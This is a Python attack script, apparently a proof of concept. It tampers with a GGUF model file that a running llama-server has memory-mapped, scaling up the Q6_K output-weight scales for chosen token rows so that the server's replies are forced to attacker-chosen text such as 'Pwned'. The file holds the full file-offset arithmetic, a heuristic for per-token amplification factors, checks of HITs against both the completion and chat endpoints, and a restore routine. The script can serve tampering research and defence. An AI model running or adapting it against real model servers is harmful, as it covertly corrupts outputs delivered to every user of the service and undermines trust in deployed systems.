# persistent llm output manipulation via gguf weight amplification
#
# llms produce next-token logits by multiplying hidden state by `output.weight`
# (shape [hidden_dim, vocab_size]). each row corresponds to one vocab token.
# this script amplifies Q6_K quantization scales (`d`) for chosen rows,
# inflating those tokens' logits so they dominate after softmax.
#
# llama-server mmap's the gguf file with MAP_SHARED, so writing to the file
# on disk propagates instantly via the kernel page cache. no ptrace, no
# process injection, no timing tricks.
#
# multi-token targets (e.g. "Pwned" = [349, 1233, 287]) need per-token
# factors because autoregressive context changes what the model expects:
#   token 0 ("P"): moderate factor, must win in neutral context
#   token 1 ("wn"): highest factor, weak natural prediction after "P"
#   token 2 ("ed"): lowest factor, context already favors it;
#     over-amplifying causes repetition loops
#
# original scale values are saved to a json backup for restoration.

import argparse
import json
import os
import struct
import requests
import subprocess
import sys
from typing import BinaryIO


DEFAULT_MODEL = "/models/tinyllama-1.1b-chat-q4_k_m.gguf"

GGML_TYPE_Q6_K = 14

# q6_k block: 256 values in 210 bytes
#   128 ql + 64 qh + 16 scales + 2 d (fp16 super-block scale)
# dequantized value ≈ d * scale[sub_block] * quantized_int
# multiplying d by N scales all 256 weights in the block by N
Q6_K_BLOCK_VALUES = 256
Q6_K_BLOCK_BYTES = 210
Q6_K_D_OFFSET = 208  # fp16 `d` field offset within a q6_k block


# gguf parsing
# gguf layout: magic, version, n_tensors, n_kv, kv pairs, tensor infos,
# alignment padding, then contiguous tensor data. we parse headers to
# find `output.weight` and compute its absolute file offset.

def read_gguf_string(f: BinaryIO) -> str:
    length = struct.unpack("<Q", f.read(8))[0]
    return f.read(length).decode("utf-8", errors="replace")


def skip_gguf_value(f: BinaryIO, vtype: int) -> None:
    sizes = {0: 1, 1: 1, 2: 2, 3: 2, 4: 4, 5: 4, 6: 4, 7: 1, 10: 8, 11: 8, 12: 8}
    if vtype == 8:
        read_gguf_string(f)
    elif vtype == 9:
        atype = struct.unpack("<I", f.read(4))[0]
        count = struct.unpack("<Q", f.read(8))[0]
        for _ in range(count):
            skip_gguf_value(f, atype)
    elif vtype in sizes:
        f.read(sizes[vtype])
    else:
        raise ValueError(f"Unknown GGUF value type {vtype}")


class TensorInfo:
    def __init__(self, name: str, dims: list[int], dtype: int, offset: int):
        self.name = name
        self.dims = dims
        self.dtype = dtype
        self.offset = offset  # relative to tensor data section


def parse_gguf(model_path: str) -> tuple[list[TensorInfo], int]:
    """Return (tensor_infos, data_section_file_offset)."""
    tensors: list[TensorInfo] = []
    with open(model_path, "rb") as f:
        if f.read(4) != b"GGUF":
            raise ValueError("Not a GGUF file")
        f.read(4)  # version
        n_tensors = struct.unpack("<Q", f.read(8))[0]
        n_kv = struct.unpack("<Q", f.read(8))[0]
        for _ in range(n_kv):
            read_gguf_string(f)
            vtype = struct.unpack("<I", f.read(4))[0]
            skip_gguf_value(f, vtype)
        for _ in range(n_tensors):
            name = read_gguf_string(f)
            n_dims = struct.unpack("<I", f.read(4))[0]
            dims = [struct.unpack("<Q", f.read(8))[0] for _ in range(n_dims)]
            dtype = struct.unpack("<I", f.read(4))[0]
            offset = struct.unpack("<Q", f.read(8))[0]
            tensors.append(TensorInfo(name, dims, dtype, offset))
        pos = f.tell()
        data_start = (pos + 31) // 32 * 32  # GGUF default alignment = 32
    return tensors, data_start


def find_output_weight(model_path: str) -> tuple[TensorInfo, int]:
    """find output.weight tensor (the final projection from hidden state to
    per-token logits). row N determines the logit for token N."""
    tensors, data_start = parse_gguf(model_path)
    for t in tensors:
        if t.name == "output.weight":
            return t, data_start
    raise ValueError("output.weight tensor not found in GGUF")


# fp16 helpers
# q6_k `d` is stored as ieee 754 half-precision; we read/write as raw uint16

def fp16_to_float(raw: int) -> float:
    return struct.unpack("e", struct.pack("<H", raw))[0]


def float_to_fp16(val: float) -> int:
    return struct.unpack("<H", struct.pack("e", val))[0]


# tokenization
# token ids tell us which rows of output.weight to amplify

def tokenize(model_path: str, text: str) -> list[int]:
    result = subprocess.run(
        ["llama-tokenize", "-m", model_path, "--ids", "--no-bos", "-p", text],
        check=True, capture_output=True, text=True,
    )
    for line in reversed(result.stdout.splitlines()):
        line = line.strip()
        if line.startswith("[") and line.endswith("]"):
            return [int(x) for x in json.loads(line)]
    raise RuntimeError(f"Cannot parse tokens for {text!r}")


def amplify_output_rows(
    model_path: str,
    data_start: int,
    tensor: TensorInfo,
    token_ids: list[int],
    factors: list[float],
    backup_path: str,
) -> dict[int, list[tuple[int, float, float]]]:
    """multiply q6_k super-block scales (`d`) for target token rows in
    output.weight. for each token id, locates its row (consecutive q6_k
    blocks in the gguf file) and multiplies every block's fp16 `d` by the
    given factor. scaling row weights by N scales the logit by ~N.
    file write propagates via page cache to the mmap'd llama-server process.
    returns {token_id: [(block_idx, old_d, new_d), ...]}."""
    if tensor.dtype != GGML_TYPE_Q6_K:
        raise ValueError(f"Expected Q6_K (type 14), got type {tensor.dtype}")

    hidden_dim = tensor.dims[0]   # e.g. 2048
    vocab_size = tensor.dims[1]    # e.g. 32000
    blocks_per_row = hidden_dim // Q6_K_BLOCK_VALUES  # e.g. 2048/256 = 8
    bytes_per_row = blocks_per_row * Q6_K_BLOCK_BYTES  # e.g. 8*210 = 1680

    report: dict[int, list[tuple[int, float, float]]] = {}
    backup_data: dict[str, dict[str, int]] = {}

    with open(model_path, "r+b") as f:
        for idx, tid in enumerate(token_ids):
            if tid >= vocab_size:
                raise ValueError(f"Token {tid} >= vocab_size {vocab_size}")

            factor = factors[idx]
            # absolute file offset of the first q6_k block for this token's row
            row_file_off = data_start + tensor.offset + tid * bytes_per_row
            entries: list[tuple[int, float, float]] = []
            block_backups: dict[str, int] = {}

            for b in range(blocks_per_row):
                # `d` field (last 2 bytes of each q6_k block)
                d_file_off = row_file_off + b * Q6_K_BLOCK_BYTES + Q6_K_D_OFFSET
                f.seek(d_file_off)
                raw = struct.unpack("<H", f.read(2))[0]
                old_d = fp16_to_float(raw)

                # amplify scale; clamp to fp16 range to avoid inf
                new_d = old_d * factor
                if new_d > 65504.0:
                    new_d = 65504.0
                elif new_d < -65504.0:
                    new_d = -65504.0
                new_raw = float_to_fp16(new_d)

                block_backups[str(d_file_off)] = raw

                f.seek(d_file_off)
                f.write(struct.pack("<H", new_raw))
                entries.append((b, old_d, new_d))

            report[tid] = entries
            backup_data[str(tid)] = block_backups

        # flush + fsync so the mmap'd process sees updated page cache
        f.flush()
        os.fsync(f.fileno())

    with open(backup_path, "w") as bf:
        json.dump(backup_data, bf)

    return report


def restore_from_backup(model_path: str, backup_path: str) -> int:
    """write original fp16 `d` values back at their saved file offsets."""
    with open(backup_path, "r") as bf:
        backup = json.load(bf)

    count = 0
    with open(model_path, "r+b") as f:
        for blocks in backup.values():
            for off_str, raw_val in blocks.items():
                f.seek(int(off_str))
                f.write(struct.pack("<H", raw_val))
                count += 1
        f.flush()
        os.fsync(f.fileno())
    return count


# /completion takes a raw prompt; /v1/chat/completions wraps it in the chat
# template (<|user|>\n...\n<|assistant|>\n), which shifts hidden state and
# makes sub-word tokens like "ed" naturally dominant at the assistant turn.

def query_server(server_url: str, prompt: str, n_predict: int = 32) -> str:
    url = server_url.rstrip("/") + "/completion"
    payload = {
        "prompt": prompt,
        "n_predict": n_predict,
        "stream": False,
        "temperature": 0.0,
    }
    resp = requests.post(url, json=payload, timeout=30)
    resp.raise_for_status()
    return resp.json().get("content", "")


def query_chat(server_url: str, prompt: str, max_tokens: int = 32) -> str:
    url = server_url.rstrip("/") + "/v1/chat/completions"
    payload = {
        "messages": [{"role": "user", "content": prompt}],
        "max_tokens": max_tokens,
        "temperature": 0.0,
    }
    resp = requests.post(url, json=payload, timeout=30)
    resp.raise_for_status()
    return resp.json()["choices"][0]["message"]["content"]


def cmd_attack(args: argparse.Namespace) -> None:
    model_path = args.model
    backup_path = args.backup or model_path + ".bias_backup.json"

    print("[1/4] Baseline request")
    baseline = query_server(args.server_url, "Hello, how are you?")
    print(f"  {baseline!r}")

    print("[2/4] Parsing GGUF model")
    tensor, data_start = find_output_weight(model_path)
    hidden_dim, vocab_size = tensor.dims[0], tensor.dims[1]
    blocks_per_row = hidden_dim // Q6_K_BLOCK_VALUES
    print(
        f"  {tensor.name}: [{hidden_dim}, {vocab_size}] Q6_K "
        f"({blocks_per_row} blocks/row, {blocks_per_row * Q6_K_BLOCK_BYTES} bytes/row)"
    )
    print(f"  data_start=0x{data_start:x}, tensor_offset=0x{tensor.offset:x}")

    target_ids = tokenize(model_path, args.target_text)
    if args.factors:
        factors = [float(x) for x in args.factors.split(",")]
        if len(factors) != len(target_ids):
            raise ValueError(
                f"--factors has {len(factors)} values but target text has {len(target_ids)} tokens"
            )
    else:
        # per-token factor heuristic: first=base, middle=base*4.5, last=base*0.75
        # middle tokens need the most amplification (weak natural prediction),
        # last token needs the least (autoregressive context helps; too high
        # causes repetition loops, especially with chat template)
        n = len(target_ids)
        factors = []
        for i in range(n):
            if i == 0:
                factors.append(args.factor)
            elif i < n - 1:
                factors.append(args.factor * 4.5)
            else:
                factors.append(args.factor * 0.75)
    factor_strs = [f"{f:.0f}" for f in factors]
    print(f"  target={args.target_text!r} -> tokens={target_ids} factors=[{', '.join(factor_strs)}]")

    print(f"[3/4] Amplifying (modifying {model_path})")
    report = amplify_output_rows(
        model_path, data_start, tensor, target_ids, factors, backup_path,
    )
    for tid, entries in report.items():
        sample = entries[0]
        print(f"  token {tid}: d {sample[1]:.6g} -> {sample[2]:.6g} ({len(entries)} blocks)")
    print(f"  backup saved to {backup_path}")

    print("[4/4] Verification")
    prompts = [
        "Hello, how are you?",
        "What is the capital of France?",
        "Tell me a joke.",
    ]
    target_lower = args.target_text.lower()
    print("  /completion endpoint:")
    compl_hits = 0
    for p in prompts:
        out = query_server(args.server_url, p, n_predict=24)
        hit = target_lower in out.lower() and "eded" not in out.lower()
        compl_hits += hit
        print(f"    [{'HIT' if hit else 'MISS'}] {p!r} -> {out[:50]!r}")

    print("  /v1/chat/completions endpoint:")
    chat_hits = 0
    for p in prompts:
        out = query_chat(args.server_url, p, max_tokens=24)
        hit = target_lower in out.lower() and "eded" not in out.lower()
        chat_hits += hit
        print(f"    [{'HIT' if hit else 'MISS'}] {p!r} -> {out[:50]!r}")

    print(f"\n  Result: completion={compl_hits}/{len(prompts)}  chat={chat_hits}/{len(prompts)}")


def cmd_restore(args: argparse.Namespace) -> None:
    model_path = args.model
    backup_path = args.backup or model_path + ".bias_backup.json"
    if not os.path.exists(backup_path):
        print(f"No backup found at {backup_path}")
        sys.exit(1)

    count = restore_from_backup(model_path, backup_path)
    os.remove(backup_path)
    print(f"Restored {count} Q6_K scale values. Backup removed.")

    print("Verification request:")
    out = query_server(args.server_url, "Hello, how are you?", n_predict=16)
    print(f"  {out!r}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Persistent LLM output manipulation via output-weight amplification",
    )
    parser.add_argument("--model", default=DEFAULT_MODEL, help="Path to GGUF model file")
    parser.add_argument("--server-url", default="http://127.0.0.1:8080")
    parser.add_argument("--backup", help="Backup file path (default: MODEL.bias_backup.json)")
    sub = parser.add_subparsers(dest="command", required=True)

    p_attack = sub.add_parser("attack", help="Amplify target token output weights")
    p_attack.add_argument("--target-text", default="Pwned")
    p_attack.add_argument(
        "--factor", type=float, default=80.0,
        help="Base amplification factor for the first target token",
    )
    p_attack.add_argument(
        "--factors",
        help="Explicit comma-separated per-token factors (e.g. '60,300,180'). "
             "Overrides --factor when set.",
    )

    sub.add_parser("restore", help="Restore original weights from backup")

    args = parser.parse_args()
    if args.command == "attack":
        cmd_attack(args)
    elif args.command == "restore":
        cmd_restore(args)


if __name__ == "__main__":
    main()
